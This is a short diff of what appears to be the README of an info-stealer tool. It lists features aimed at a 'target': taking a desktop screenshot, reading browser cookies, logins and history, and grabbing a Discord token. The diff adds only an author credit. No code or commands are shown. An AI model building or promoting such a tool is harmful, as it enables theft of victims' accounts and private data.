@@ -12,3 +12,5 @@
 ### 2. It'll take a screenshot of the target desktop
 ### 3. It'll read out the targets browser data (cookies, logins, web history)
 ### 4. It'll read out the targets discord token and some other information
+
+Made by ΔŘ€Ø
